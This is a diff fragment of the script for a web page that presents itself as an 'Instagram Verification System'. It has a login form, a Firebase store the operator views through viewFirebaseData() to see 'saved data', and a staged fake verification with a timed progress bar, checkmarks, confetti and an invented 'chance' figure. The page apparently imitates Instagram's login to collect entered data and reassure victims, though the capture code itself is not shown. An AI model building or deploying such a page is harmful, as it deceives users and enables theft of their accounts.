+                    document.getElementById('flipContainer').classList.add('active');
+                    setTimeout(() => {
+                        document.getElementById('flipCard').classList.add('flipped');
+                    }, 600);
+                }, 400);
+                
+                startProgress(username, chance);
+            }, 3000);
+        }
 
-import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.157.0/build/three.module.js';
+        // ============================================
+        // PROGRESS WITH EFFECTS
+        // ============================================
+        function startProgress(username, chance) {
+            let progress = 0;
+            const percentEl = document.getElementById('percentText');
+            
+            setTimeout(() => {
+                document.getElementById('step1').classList.add('active', 'done');
+                document.getElementById('step1').querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+            }, 800);
+            
+            setTimeout(() => {
+                document.getElementById('step2').classList.add('active', 'done');
+                document.getElementById('step2').querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+            }, 2200);
+            
+            setTimeout(() => {
+                document.getElementById('step3').classList.add('active', 'done');
+                document.getElementById('step3').querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+            }, 3600);
+            
+            const interval = setInterval(() => {
+                progress += 1;
+                percentEl.textContent = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    document.body.classList.add('shake-active');
+                    setTimeout(() => {
+                        document.body.classList.remove('shake-active');
+                    }, 600);
+                    
+                    setTimeout(() => {
+                        showVerified(username, chance);
+                    }, 500);
+                }
+            }, 45);
+        }
 
-// baaki code...
+        // ============================================
+        // SHOW VERIFIED
+        // ============================================
+        function showVerified(username, chance) {
+            showStep('stepVerified');
+            document.getElementById('verifiedUsername').textContent = '@' + username;
+            
+            // ===== SHOW CHANCE =====
+            document.getElementById('chanceDisplay').textContent = `⚡ ${chance}% chance • keep going`;
+            
+            document.getElementById('scanLine').classList.remove('active');
+            
+            launchConfetti();
+            
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100]);
+            }
+        }
 
-</script>
+        // ============================================
+        // UTILITY FUNCTIONS
+        // ============================================
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+        }
 
-</body>  
+        function launchConfetti() {
+            const container = document.getElementById('confettiContainer');
+            const colors = ['#0095f6', '#ff2d55', '#ffcc00', '#34c759', '#ff9500', '#af52de', '#ff6b6b', '#00d2ff'];
+            
+            for (let i = 0; i < 150; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = (Math.random() * 8 + 4) + 'px';
+                confetti.style.height = (Math.random() * 8 + 4) + 'px';
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                confetti.style.animationDuration = (Math.random() * 2 + 1.5) + 's';
+                confetti.style.animationDelay = (Math.random() * 2) + 's';
+                container.appendChild(confetti);
+            }
+            
+            setTimeout(() => {
+                container.innerHTML = '';
+            }, 4000);
+        }
+
+        function goBack() {
+            document.getElementById('verifyContainer').style.display = 'none';
+            document.getElementById('loginContainer').classList.remove('hidden');
+            document.getElementById('confettiContainer').innerHTML = '';
+            document.getElementById('scanLine').classList.remove('active');
+            document.getElementById('flipContainer').classList.remove('active');
+            document.getElementById('flipCard').classList.remove('flipped');
+            
+            document.querySelectorAll('.processing-step-item').forEach(el => {
+                el.classList.remove('done', 'active');
+            });
+            document.getElementById('step1').querySelector('.step-icon').innerHTML = '<i class="fas fa-user"></i>';
+            document.getElementById('step2').querySelector('.step-icon').innerHTML = '<i class="fas fa-shield-alt"></i>';
+            document.getElementById('step3').querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+            
+            document.getElementById('percentText').textContent = '0%';
+            showStep('stepLoading');
+            
+            document.body.classList.remove('shake-active');
+        }
+
+        function forgotPassword() {
+            alert("🔐 Password reset link sent (demo)");
+        }
+
+        function showCreateAccountModal() {
+            alert("📝 Create account form (demo)");
+        }
+
+        function showLanguageMenu() {
+            alert("🌍 Language menu (demo)");
+        }
+
+        // ============================================
+        // INITIALIZE
+        // ============================================
+        window.onload = () => {
+            document.getElementById('username').focus();
+            initFirebase();
+            console.log('✅ Instagram Verification System Loaded!');
+            console.log('📌 Type viewFirebaseData() to see saved data');
+        };
+    </script>
+</body>
 </html>
